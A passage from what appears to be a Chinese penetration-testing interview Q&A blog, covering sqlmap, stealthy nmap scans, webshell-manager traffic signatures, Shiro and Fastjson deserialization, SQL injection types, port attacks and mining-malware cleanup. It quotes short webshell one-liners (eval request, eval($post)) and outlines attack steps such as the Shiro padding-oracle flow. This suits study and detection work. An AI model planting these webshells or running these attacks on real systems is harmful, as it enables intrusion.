--first=FIRSTCHAR 以第一个查询输出的字符检索，不懂。
--last=LASTCHAR 以最后一个查询输出的字符检索，不懂+2。
--sql-query=QUERY 执行一个sql语句。
--sql-shell 创建一个sql的shell。
--sql-file=SQLFILE 执行一个给定文件中的sql语句
</code></pre>
<h2 id="42-sqlmap-os-shell-后台执行了什么操作">42.sqlmap --os-shell 后台执行了什么操作</h2>
<p>sqlmap --os-shell,就是上传了两个php文件,一个上传一个tmpugvzq.php可以让我们上传文件到网站路径下,然后sqlmap这个php上传一个用于命令执行的tmpbylqf.php到网站路径下，让我们命令执行</p>
<ul>
<li>利用条件</li>
</ul>
<p>secure_file_priv无限制—转义一些特殊字符</p>
<p>网站路径有写入权限</p>
<p>高权限数据库用户</p>
<p>知道网站的物理路径</p>
<h2 id="43-nmap怎么隐藏ip扫描">43.nmap怎么隐藏ip扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sN;-sF;-sX 【目标】 隐蔽扫描</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sN</span><br></pre></td></tr></table></figure>
<p>特点：扫描效率低，需要等待超时，不能适用所有系统</p>
<p>发送NULL（原理同FIN）<br>
\1. LISTEN端口丢弃<br>
\2. CLOSED端口回复RST</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sX</span><br></pre></td></tr></table></figure>
<p>发送FIN+URG+PSH（原理同FIN）<br>
\1. LISTEN端口丢弃<br>
\2. CLOSED端口回复RST<br>
特点：扫描效率低，需要等待超时，不能适用所有系统</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sF</span><br></pre></td></tr></table></figure>
<p>发送FIN<br>
\1. LISTEN端口丢弃<br>
\2. CLOSED端口回复RST<br>
特点：扫描效率低，需要等待超时</p>
<h2 id="44-挖过SRC吗">44.挖过SRC吗?</h2>
<p>教育SRC,漏洞盒子,CVE</p>
<h2 id="45-用过哪些安全设备">45.用过哪些安全设备</h2>
<p>waf,宝塔,微步云沙箱,D盾</p>
<p>用过比特梵得,卡巴斯基,火绒,360杀毒,金山毒霸</p>
<h2 id="46-Webshell管理工具的流量特征">46.Webshell管理工具的流量特征</h2>
<h3 id="Cobalt-Strike流量特征">Cobalt Strike流量特征</h3>
<p><strong>心跳包</strong></p>
<p>请求的url为/jquery-3.3.1.min.js，返回包的大小为5543，返回包到下一个请求包之间的时间为心跳时间。</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405120002973.png" alt="img"></p>
<p><strong>sleep</strong></p>
<p>请求的url为/jquery-3.3.1.min.js，返回包大小为5607，包含指令数据。执行完之后，下一个请求包按照新的时间发送心跳包。</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405120003874.png" alt="img"></p>
<p><strong>shell</strong></p>
<p>这里的shell指令，对应“shell whoami”，其请求的url为/jquery-3.3.1.min.js，返回包大小为5628，包含指令数据。下一个包发送POST请求，url为/jquery-3.3.2.min.js，body部分包含指令执行的结果，大小为96。另外，接收到指令到执行完指令，并返回结果，时间间隔为0.098093s。</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/202405120003769.png" alt="img"></p>
<h3 id="菜刀">菜刀</h3>
<p>菜刀默认使用了base64编码,使用eval(有少数时候eval方法会被assert方法替代)</p>
<p>shell特征:默认传输参数名<code>z0</code>,还存在<code>int_set(&quot;display_erros&quot;,&quot;0&quot;)</code>字符串特征</p>
<p>payload的特征：</p>
<ol>
<li>php:</li>
<li>asp:&lt;%eval request(“caidao”)%&gt;</li>
<li><a target="_blank" rel="noopener" href="http://asp.net">asp.net</a>:&lt;%@Page Language=“Jscript”%&gt;&lt;%eval(Request.Item[“caidao”],“unsafe”);%&gt;</li>
</ol>
<p>数据包流量特征：</p>
<ol>
<li>请求体中有eval，base64等特征字符</li>
<li>请求体中传递的payload为base64编码，并且是固定的</li>
</ol>
<h3 id="蚁剑">蚁剑</h3>
<p>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“<strong>_0x</strong>…=”这种形式（下划线可替换为其他）所以，以**_0x开头的参数名**,也是一种特征</p>
<p>默认的蚁剑shell,连接时会请求两次,请求只是经过url编码</p>
<p>第一次请求,关闭报错和magic_quotes,接下来去获取主机的信息</p>
<p>第二次请求,会把主机目录列出来</p>
<p>magic_quotes中的常见设置会将一些特殊字符转义</p>
<p>payload的特征：</p>
<ol>
<li>php中使用assert，eval执行</li>
<li>asp使用eval执行</li>
<li>jsp中使用的是Java类加载（ClassLoader），同时会带有base64编码解码等字符特征</li>
</ol>
<p>数据包流量特征：请求体中一定有@in_set(“display_errors”,“0”);@set_time_limit(0)开头，后面存在base64等字符</p>
<h3 id="冰蝎">冰蝎</h3>
<p><strong>冰蝎强特征：content-type为application/octet-stream</strong></p>
<h4 id="冰蝎2-0">冰蝎2.0</h4>
<p>使用AES加密发起三次请求</p>
<p>第一次请求<strong>服务端</strong>产生密钥写入session,session和当前会话绑定不同的客户</p>
<p>第二次请求是为了获取key</p>
<p>第三次使用key和AES加密进行通信</p>
<h4 id="冰蝎3-0">冰蝎3.0</h4>
<p>使用AES加密发起请求</p>
<p>3.0比2.0少了动态密钥的获取请求,不在使用随机生成的key,改为取连接密码的md5加密值的前16位作为密钥</p>
<p>第一次请求为判断是否可以建立连接,少了两次get获取冰蝎动态密钥的行为</p>
<p>第二次发送phpinfo等代码执行,获取网站信息</p>
<h4 id="冰蝎4-0">冰蝎4.0</h4>
<p>4.0提供了<code>传输协议自定义</code>功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。4.0不再有连接密码的概念，你的自定义传输协议的算法就是连接密码</p>
<h5 id="流量特征Content-Type字段">流量特征Content-Type字段</h5>
<p>PHP站点：Application/x-www-form-urlencoded<br>
ASP站点：Application/octet-stream</p>
<h5 id="User-agent-字段">User-agent 字段</h5>
<p>冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。</p>
<h5 id="流量特征长连接">流量特征长连接</h5>
<p>冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection。</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">Connection: Keep-Alive</span></span><br></pre></td></tr></table></figure>
<h5 id="流量特征固定的请求头和响应头">流量特征固定的请求头和响应头</h5>
<p>PHP站点默认口令Default_xor_base64协议加密流量特征，请求字节头：<br>
dFAXQV1LORcHRQtLRlwMAhwFTAg/M</p>
<p>响应字节头：<br>
TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</p>
<p>PHP站点默认口令Default_aes协议加密流量特征，请求字节头：<br>
m7nCS8n4OZG9akdDlxm6OdJevs/jYQ5/IcXK</p>
<p>响应字节头：<br>
mAUYLzmqn5QPDkyI5lvSp6DmrC24FW39Y4YsJhUqS7</p>
<p>JSP站点默认口令Default_xor_base64协议，aes_with_magic协议，Default_aes协议,加密流量特征，响应字节头：<br>
QhoVQgMXEUcUCBMHAGFZaQtuHFUVXlkWGhBcF1QVCRJ</p>
<h5 id="端口">端口</h5>
<p>冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。</p>
<h5 id="HP-webshell-中存在固定代码">HP webshell  中存在固定代码</h5>
<p>$post=Decrypt(file_get_contents(“php://input”));</p>
<p>eval($post);</p>
<h5 id="流量特征连接密码">流量特征连接密码</h5>
<p>默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</p>
<h4 id="哥斯拉">哥斯拉</h4>
<h5 id="ookie">ookie</h5>
<p>在Cookie中有一个很明显的特征：最后有一个分号</p>
<h5 id="响应体">响应体</h5>
<p>从代码中可以看到会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分</p>
<p>整个响应包的结构体征为：<strong>md5前十六位+base64+md5后十六位</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">72a9c691ccdaab98fL1tMGI4YTljO/<span class="number">5</span>+<span class="regexp">/PlQm9MGV7lTjFUKUdfQMDL/</span>j64wJ2UwYg==b4c4e1f6ddd2a488</span><br></pre></td></tr></table></figure>
<h5 id="连接特征">连接特征</h5>
<ol>
<li>请求1：发送一段固定代码（payload），返回内容为空</li>
<li>请求2：发送一段固定代码（test），返回内容为固定字符串，如下：<code>72a9c691ccdaab98fL1tMGI4YTljO/79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488</code>，解密后即为<strong>ok</strong>。如果连接失败返回内容为空，且不发起请求3</li>
<li>请求3：发送一段固定代码（getBacisInfo），返回内容为固定字符串（对应服务器信息）</li>
</ol>
<h2 id="47-shiro550和shiro721的区别">47.shiro550和shiro721的区别</h2>
<h3 id="shiro550">shiro550</h3>
<p>*<em>漏洞原理:</em></p>
<p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。<br>
那么，Payload产生的过程：<br>
命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值<br>
在整个漏洞利用过程中，比较重要的是AES加密的密钥</p>
<h3 id="shiro721">shiro721</h3>
<p><strong>漏洞原理：</strong><br>
由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
<p>虽然使用Padding Oracle Attack可以绕过密钥直接构造攻击密文，但是在进行攻击之前我们需要获取一个合法用户的Cookie。</p>
<p><strong>影响版本：</strong></p>
<p>Apache Shiro &lt; 1.4.2版本。</p>
<p><strong>漏洞流程:</strong></p>
<p>登录网站获取合法Cookie</p>
<p>使用rememberMe字段进行Padding Oracle Attack，获取intermediary</p>
<p>利用intermediary构造出恶意的反序列化密文作为Cookie</p>
<p>使用新的Cookie请求网站执行攻击</p>
<p><strong>漏洞利用:</strong></p>
<p>在Shiro550中，我们可以直接通过硬编码密钥直接生成攻击密文。但是Shiro721使用了动态密钥，无法直接获取密钥。但是仍然可以通过Padding Oracle Attack绕过密钥，直接生成攻击密文。</p>
<p>**出网协议：**jndi、ldap、rmi、JRMP、JMX、JMS</p>
<h2 id="48-java反序列化了解吗-讲一些shiro550漏洞">48.java反序列化了解吗?讲一些shiro550漏洞</h2>
<p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。<br>
那么，Payload产生的过程：<br>
命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值<br>
在整个漏洞利用过程中，比较重要的是AES加密的密钥</p>
<p>在<code>rememberSerializedIdentity()</code>方法中会对我们传入的序列化字符串<code>serialized</code>进行base加密并将其作为Cookie。</p>
<p>最终跟进到<code>onSuccessfulLogin()</code>方法中，再次跟进，可以看到该方法被<code>rememberMeSuccessfulLogin()</code>调用，这里应该就是”记住我”的功能点了，我们再这里下个断点调试</p>
<p>跟进<code>removeFrom()</code>方法，removeForm主要在response头部添加字段<code>Set-Cookie: rememberMe=deleteMe</code></p>
<p>在<code>convertPrincipalsToBytes()</code>方法中，先对用户名进行序列化，然后使用<code>encrypt()</code>进行加密，</p>
<p>在<code>encrypt()</code>中，可以看到使用的加密算法是AES，使用AES算法对cookie进行加密。</p>
<p><code>getEncryptionCipherKey()</code>方法返回加密的密钥，我们跟进看一下加密的密钥是什么</p>
<p>在<code>AbstractRememberMeManager()</code>方法中赋值，可以看见这里这个常量应该就是密钥</p>
<p><strong>可以看见密钥*DEFAULT_CIPHER_KEY_BYTES*是一个常量，这里就是漏洞利用的关键点</strong></p>
<p><img src="https://api2.mubu.com/v3/document_image/359a1143-6ce7-4172-9456-3985ad2ba1bc-11301279.jpg" alt="img"></p>
<h1>49.了解过鱼叉攻击和水坑攻击吗？</h1>
<p>**鱼叉攻击:**钓鱼邮件 有针对性</p>
<p>**水坑攻击：**技术含量比较高了,需要先找出目标经常浏览网站的</p>
<p>**水坑攻击：**watering hole。在受害者必经之路设置一个水坑，就是陷进。常见的做法是攻击者分析攻击目标的上网活动规律，经常访问哪些网站，然后利用网站漏洞在其中植入攻击代码，用户访问该网站就中招了。这种方式隐蔽性高，成功率较高。但有一定条件，网站要有漏洞可利用，以便用于部署恶意代码。用户访问被“加工”过的网站时，攻击代码会在客户端植入恶意代码或者直接窃取用户信息，有些就是将用户跳转到其他恶意网站。这些恶意网站中，恶意软件正等待将其与后续的网络钓鱼或勒索软件攻击挂钩。</p>
<p>鱼叉攻击：社工的方式很多人都明白，但是真有些防不胜防，比较多的方式还是使用钓鱼邮件，那我们就看看（spear phishing）鱼叉攻击。鱼叉攻击，肯定是有看到了鱼再叉，也就是有针对性的攻击，目标明确，比如公司或团体，给这些特定团体发送包含木马的邮件，这种邮件要让受害者打开，就需要一个欺骗和迷惑的标题。这个题目和内容的构造就考验红方的想象力了。比如打补丁的通知邮件，放假通知安排，投诉举报，简历投递或者来点公司的劲爆信息引爆吃瓜群众。员工点了附件之后，就中了木马，黑客在远端就可以远程控制这个电脑了。</p>
<h1>50.报错注入有哪些函数?</h1>
<ul>
<li>
<h2 id="floor-函数">floor()函数</h2>
<p>一个最重要的特性，就是group by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次（也就是两次，但有些博客写的是多次，这个多次到底是几次并不知道，但是以两次来理解下面的实验都能说的通）。就是这个特性导致了主键重复并报错。又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</p>
<p>报错的原因是因为**rand()函数在查询的时候会执行一次,插入的时候还会执行一次.**这就是整个语句报错的关键</p>
</li>
<li>
<h2 id="updatexml报错">updatexml报错</h2>
<p><code>updatexml(XML_document,XPath_string,new_value)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath格式的字符串，</span><br><span class="line">第三个参数：new_value,String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>
<p>updatexml第二个参数需要的是XPath格式的字符串。我们输入的不符合。故报错。(可以通过爆破来找出更多null)</p>
<p>updatexml回显的最大长度为32位，可以用limit解决。</p>
</li>
<li>
<h2 id="extravalue报错">extravalue报错</h2>
<p>extractvalue()：从目标XML中返回包含所查询值的字符串。</p>
<p>EXTRAVALUE()(XML_document,XPath_string);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一个参数：XML_document---是string格式,为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string---（XPath格式的字符串）</span><br></pre></td></tr></table></figure>
<p>报错原因与updatexml一样：不是XPath格式字符串</p>
<p>并且也只能传回32位</p>
</li>
<li>
<h2 id="整数溢出报错">整数溢出报错</h2>
</li>
<li>
<h2 id="exp报错">exp报错</h2>
</li>
<li>
<h2 id="pow报错">pow报错</h2>
</li>
</ul>
<p>还有更多</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43348375/article/details/123909559?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-123909559-blog-122846028.pc_relevant_blogantidownloadv1&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">https://blog.csdn.net/qq_43348375/article/details/123909559?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-123909559-blog-122846028.pc_relevant_blogantidownloadv1&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a></p>
<h1>51.二次注入原理是什么?</h1>
<p><strong>举个简单的例子就是:</strong></p>
<p>当我们对这个网站入进去了一个代码语句而这个代码的功能就是生成一个查询用户的sql语句</p>
<p>当我们去执行这个sql语句的时候他就会返回用户了</p>
<p>我去调用内鬼就类似是一次注入了</p>
<p>内鬼的内鬼接受到命令查询就二次注入了</p>
<p><strong>具体来讲</strong></p>
<p>有两个界面，1.php是用户注册的页面（不一定是注册，主要是一个可以插入sql语句的页面），另外一个2.php通过某些参数（比如ID）去读取用户信息（比如用户名）的页面。在注册用户名的页面，我们注册一个 test’ 的用户，这个单引号被成功插入到了数据库（先不管用户名不给单引号的事实，可以是插入其他的信息，比如个签等）。</p>
<p>因此这里我们就可以成功将单引号插入到数据库中，在2.php我们去查询这个用户名的时候，如果在取出用户名的时候没有进行addslashes过滤，那我们的单引号就可以成功被带出来供我们下一步的使用了。</p>
<p>这个例子就是在第一步构造出能够被单引号闭合的用户名,</p>
<p>在第二步查询用户名的时候就可以利于单引号</p>
<h1>52.堆叠注入原理是什么?</h1>
<p>原理：堆叠注入就是利用了堆叠查询可以执行多条语句，多语句之间以分号隔开的特点，在第二个sql语句中构造自己想要执行的语句。</p>
<p>由于现在很多都会采用PDO预编译来预防sql注入问题，虽然PDO可以执行多语句，但是PDO只会返回第一条sql语句执行的结果，所以在第二条语句可以用update更新数据或者使用时间盲注获取数据</p>
<h1>53.讲一讲weblogic有哪些CVE</h1>
<ul>
<li>反序列化漏洞</li>
<li>远程代码执行漏洞</li>
<li>任意文件读取漏洞</li>
<li>文件上传漏洞</li>
<li>jndi注入</li>
<li>coherence组件iiop反序列化漏洞</li>
<li>UniversalExtractor反序列化漏洞</li>
<li>github上还有漏洞扫描工具</li>
</ul>
<h1>54.Fastjson漏洞原理</h1>
<p>Fastjson反序列化漏洞被利用的原因，可以归结为两方面：</p>
<ul>
<li>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；</li>
<li>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。</li>
</ul>
<p><strong>防护</strong></p>
<p>不使用autotype</p>
<h1>55.如何判断shiro框架？</h1>
<p>返回包中包含rememberMe=deleteMe字段。</p>
<p>Remember勾选后,返回一个极长的cookie</p>
<h1>56.你还知道哪些框架？框架哪些漏洞？如何修复？</h1>
<ul>
<li>
<h2 id="thinkphp">thinkphp</h2>
</li>
</ul>
<p><strong>远程命令执行</strong></p>
<p>在修复之前程序未对控制器进行过滤，导致攻击者可以通过引入 \ 符号来调用任意类方法。</p>
<p><strong>防护</strong></p>
<p>安装补丁,更新到最新版本</p>
<ul>
<li>
<h2 id="Flask">Flask</h2>
</li>
</ul>
<ol>
<li>jinja2 模板注入(Mako jinja2 Twig Smarty)</li>
<li>PIN 码 rce</li>
<li>session 伪造</li>
</ol>
<p>就是SSTI</p>
<p><strong>原理:</strong></p>
<p>在题目中好像是要从类里调用函数调用变量，调用对象来进行注入</p>
<ul>
<li><strong>Struts2</strong></li>
</ul>
<p>S2-057,S2-001远程代码执行漏洞—远程代码执行</p>
<p>Spring</p>
<p>Shiro550,527</p>
<p>Fastjson</p>
<p>反序列化漏洞被利用的原因，可以归结为两方面：</p>
<ul>
<li>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；</li>
<li>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。</li>
</ul>
<p><strong>防护</strong></p>
<p>不使用autotype</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/SSTI.png" alt="SSTI"></p>
<h1>57.域接触多少？</h1>
<p>是Windows的一种服务，是一个个目录数据库，集中存储着整个Windows网络中的用户账号，组，计算机，共享文件夹等对象信息。</p>
<p>**域(Domain)：**将网络中的多台计算机通过逻辑的方式组织到一起，进行集中管理，这种集中管理的环境称为域。</p>
<p><strong>域控制器（Domain Controller，DC)</strong>：每个域中至少有一台域控制器、集中存放整个域的用户账号和安全<a target="_blank" rel="noopener" href="https://cloud.tencent.com/solution/database?from=20065&amp;from_column=20065">数据库</a>，安装了活动目录(AD)的主机称为域控制器。</p>
<p><strong>活动目录（Active Directory，AD)</strong>：活动目录是一个目录数据库，存储整个windows网络中对象的相关信息（可以理解为存储了网络中所有资源的快捷方式）。也是一种服务，可对活动目录中数据执行各种操作。</p>
<p><strong>父域和子域</strong>：出于管理需求，需要在网络中划分多个域。第一个域称为父域，各分部的域称为子域。不同的域之间，信息交互的条目会大大减少，且可以压缩后进行交互，节约带宽。并且域管可以针对各个域，设置不同的安全策略，灵活管理。</p>
<p><strong>域树 (Tree)</strong>：域管只能管理本域，如果需要管理其他域，则需要建立信任关系，域树则是指多个域通过建立信任关系组成的集合。同理，多个域树通过建立信任关系组成的集合则称为域林。</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/domain-sales?from=20065&amp;from_column=20065"><strong>域名</strong></a><strong>服务器 (DNS)</strong>：用于实现域名和与之对应的IP地址之间相互转换。因为域中的计算机是使用DNS来定位域控和其他服务器的，所以域的名字就是DNS域的名字。（DNS和DC一般在同一台机器上）</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42322913/article/details/109636636">https://blog.csdn.net/weixin_42322913/article/details/109636636</a></p>
<p><strong>如何判断域控？</strong></p>
<p><code>systeminfo</code> 或  <code>net view /domain</code> 或<code>net config /domain</code></p>
<p>横向渗透 纵向渗透</p>
<p><em>Outlook Web</em> App (OWA)</p>
<h1>58.有没有搭过应急环境</h1>
<p>指的是靶场吗?搭过红日系列的靶场,里面的痕迹清除也算是一种应对入侵的方式吧(应该要问应急响应)</p>
<h1>59.XXE是不是TOP10？</h1>
<p>有的文章说是,有的说不是</p>
<p>XXE<strong>曾是</strong>OWASP Top 10 的第四位,但在2021年的版本中安全配置错误的类别</p>
<p>漏洞类别区分没有很明显</p>
<p><a target="_blank" rel="noopener" href="https://brightsec.com/blog/security-misconfiguration/">根据网上的搜索结果，XXE被归入安全配置错误类别，而不是注入类别，可能有以下几个原因</a><a target="_blank" rel="noopener" href="https://brightsec.com/blog/security-misconfiguration/">1</a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe">2</a>：</p>
<ul>
<li>XXE漏洞的产生往往是由于XML解析器的默认配置没有禁用外部实体的解析，而不是由于用户输入的数据被当作命令或查询的一部分执行。因此，XXE漏洞更像是一种配置错误，而不是一种注入攻击。</li>
<li>XXE漏洞的利用方式和影响范围与其他类型的注入攻击有所不同。XXE漏洞可以用来读取服务器上的任意文件，发起SSRF攻击，或者通过错误信息或外带通道获取敏感数据。这些攻击方式和影响范围与SQL注入或命令注入等更常见的注入攻击有所区别。</li>
<li>XXE漏洞的防御措施和其他类型的注入攻击也有所不同。XXE漏洞的最佳防御措施是禁用XML解析器对外部实体的解析，或者使用白名单过滤允许解析的实体。这些措施与对用户输入进行编码或转义等防止注入攻击的措施有所区别。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://owasp.org/Top10/">OWASP 前 10：2021</a></p>
<h1>60.挖矿病毒判断&amp;挖矿常见手段&amp;处理</h1>
<p><strong>“肉眼”排查</strong></p>
<p>消耗大量的CPU或GPU资源,由于挖矿程序通常会占用大量的系统资源和网络资源，所以结合经验是快速判断企业内部是否遭受恶意挖矿攻击的最简易手段。</p>
<p>通常企业机构内部出现异常的多台主机卡顿情况,在线业务或服务出现频繁无响应，内部网络出现拥堵，在反复重启，并排除系统和程序本身的问题后依然无法解决，那么就需要考虑是否感染了恶意挖矿程序。</p>
<p><strong>进程行为</strong></p>
<p>top命令查看CPU占用率情况，并按C键通过占用率排序，查找CPU高的进程。</p>
<blockquote>
<p>在top命令执行过程中可以使用的一些交互命令。这些命令都是单字母的，如果在命令行中使用了-s选项， 其中一些命令可能会被屏蔽。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M：根据驻留内存大小进行排序；</span><br><span class="line">P：根据CPU使用百分比大小进行排序；</span><br></pre></td></tr></table></figure>
</blockquote>
<p>df -m   以Mb为单位显示磁盘使用量和占用率</p>
<p><strong>网络连接状态</strong><br>
netstat -ano命令查看主机网络连接状态和对应进程，查看是否存在异常的连接。</p>
<p><strong>自启动或任务计划脚本</strong><br>
查看自启动或定时任务列表，例如通过crontab查看当前的定时任务。</p>
<p><strong>安全防护日志</strong><br>
查看内部网络和主机的安全防护设备告警和日志信息，查找异常。</p>
<ul>
<li>
<h2 id="清除恶意挖矿程序">清除恶意挖矿程序</h2>
</li>
</ul>
<ol>
<li>终止挖矿进程，删除挖矿文件和服务。</li>
<li>检查是否可疑计划任务和可疑启动项，删除挖矿相关的任务、服务、启动项。</li>
<li>检查hosts、user等配置文件，删除可疑新增的内容。</li>
</ol>
<ul>
<li>
<h3 id="防护恶意挖矿攻击">防护恶意挖矿攻击</h3>
</li>
</ul>
<p>应该在其企业内部使用的相关系统，组件和服务出现公开的相关远程利用漏洞时，尽快更新其到最新版本，或在为推出安全更新时采取恰当的缓解措施。</p>
<p>对于在线系统和业务需要采用正确的安全配置策略，使用严格的认证和授权策略，并设置复杂的访问凭证。<br>
加强人员的安全意识，避免企业人员访问带有恶意挖矿程序的文件、网站。</p>
<p>杜绝内部人员的主动挖矿行为。</p>
<ul>
<li>
<h2 id="传播方式">传播方式</h2>
</li>
</ul>
<p>例如钓鱼欺诈，色情内容诱导，伪装成热门内容的图片或文档，捆绑正常应用程序等</p>
<h1>61.常见端口漏洞</h1>
<p><strong>Memcached    11211</strong></p>
<p>mysql 3306</p>
<ul>
<li>
<h3 id="22-端口（SSH）">22 端口（SSH）</h3>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全攻击：弱口令、暴力猜解、用户名枚举</span><br><span class="line">利用方式：</span><br><span class="line">1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，</span><br><span class="line">2、利用弱口令/暴力破解，获取目标主机权限。</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="1433-端口（sql-server）">1433 端口（sql server）</h3>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：弱口令、暴力破解</span><br><span class="line">利用方式：差异备份getshell、SA账户提权等</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="25-465端口渗透剖析">25/465端口渗透剖析</h3>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件</span><br><span class="line">默认端口：25（smtp）、465（smtps）</span><br><span class="line">（1）爆破：弱口令</span><br><span class="line">（2）未授权访问</span><br></pre></td></tr></table></figure>
<ul>
<li>
<h3 id="443-端口（SSL）">443 端口（SSL）</h3>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全漏洞：OpenSSL 心脏出血</span><br><span class="line">利用方式：攻击者可以远程读取存在漏洞版本的openssl服务器内存中长达64K的数据。</span><br><span class="line">扫描脚本：nmap -sV --script=ssl-heartbleed &lt;target&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>445</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">永恒之蓝</span><br></pre></td></tr></table></figure>
<h1>62.Linux日志分析技巧命令</h1>
<h4 id="检查系统日志-3">检查系统日志</h4>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">定位有多少IP在爆破主机的root帐号：</span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">| more</span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o 